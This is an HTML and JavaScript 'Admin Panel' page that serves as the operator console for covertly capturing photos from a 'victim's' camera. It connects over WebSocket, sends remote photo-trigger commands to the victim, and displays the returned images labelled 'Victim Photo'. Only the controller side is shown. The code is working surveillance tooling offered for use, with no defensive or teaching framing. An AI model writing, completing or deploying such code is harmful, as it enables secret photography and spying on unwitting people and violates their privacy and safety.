<!DOCTYPE html>
<html>
<head>
    <title>Admin Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background: #f9f9f9;
        }
        .status-indicator {
            color: green;
            font-weight: bold;
            margin-bottom: 20px;
        }
        #photos-container {
            text-align: center;
        }
        .photo-item {
            margin: 10px;
            display: inline-block;
            border: 1px solid #ddd;
            padding: 10px;
            background: white;
            border-radius: 5px;
        }
        .photo-item img {
            width: 150px;
            height: 150px;
            object-fit: cover;
        }
        button {
            padding: 10px 20px;
            margin: 5px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #0056b3;
        }
        .admin-controls {
            margin: 20px 0;
            padding: 15px;
            background: #e9ecef;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <h1>Admin Panel</h1>
    <div class="status-indicator">Disconnected - Connecting...</div>

    <div class="admin-controls">
        <button onclick="triggerPhoto()">Trigger Photo Capture</button>
        <button onclick="refreshPhotos()">Refresh Photos</button>
    </div>

    <div id="photos-container">
        <h3>Photos Received:</h3>
        <p>No photos received yet...</p>
    </div>

    <script>
        // WebSocket connection
        let socket;
        let wsConnected = false;
        let photoCount = 0;

        // Connect to WebSocket server
        function connectWebSocket() {
            try {
                // For local testing, use WebSocket connection
                socket = new WebSocket('ws://localhost:8080');

                socket.onopen = function(event) {
                    console.log('WebSocket connected');
                    wsConnected = true;
                    document.querySelector('.status-indicator').textContent = 'Connected to Server âœ“';
                };

                socket.onmessage = function(event) {
                    try {
                        const data = JSON.parse(event.data);
                        console.log('Received from victim:', data);

                        if (data.type === 'photo_taken') {
                            // Display received photo
                            displayPhoto(data.data, data.photoNumber, data.timestamp);
                        }
                    } catch (e) {
                        console.error('Error parsing WebSocket message:', e);
                    }
                };

                socket.onclose = function(event) {
                    console.log('WebSocket disconnected');
                    wsConnected = false;
                    document.querySelector('.status-indicator').textContent = 'Disconnected - Reconnecting...';
                    // Try to reconnect
                    setTimeout(connectWebSocket, 3000);
                };

                socket.onerror = function(error) {
                    console.error('WebSocket error:', error);
                };
            } catch (e) {
                console.error('WebSocket connection failed:', e);
                document.querySelector('.status-indicator').textContent = 'Local Mode Active';
            }
        }

        // Display photo from victim
        function displayPhoto(imageData, photoNumber, timestamp) {
            const photosContainer = document.getElementById('photos-container');

            // Remove "No photos" message if it exists
            const noPhotos = photosContainer.querySelector('p');
            if (noPhotos && noPhotos.textContent.includes('No photos')) {
                photosContainer.innerHTML = '<h3>Photos Received:</h3>';
            }

            const photoDiv = document.createElement('div');
            photoDiv.className = 'photo-item';
            photoDiv.innerHTML = `
                <img src="${imageData}" alt="Victim Photo">
                <p>Photo #${photoNumber} - ${new Date(timestamp).toLocaleTimeString()}</p>
            `;

            // Add to beginning of container
            photosContainer.insertBefore(photoDiv, photosContainer.firstChild);
        }

        // Trigger photo capture from admin
        function triggerPhoto() {
            if (wsConnected && socket) {
                socket.send(JSON.stringify({
                    type: 'admin_trigger_photo',
                    message: 'Admin triggered photo capture'
                }));
                document.querySelector('.status-indicator').textContent = 'Photo trigger sent to victim';
            } else {
                document.querySelector('.status-indicator').textContent = 'Not connected to victim';
            }
        }

        // Refresh photos (simulated)
        function refreshPhotos() {
            document.querySelector('.status-indicator').textContent = 'Photos refreshed';
        }

        // Initialize when page loads
        window.addEventListener('load', function() {
            connectWebSocket();
        });
    </script>
</body>
</html>
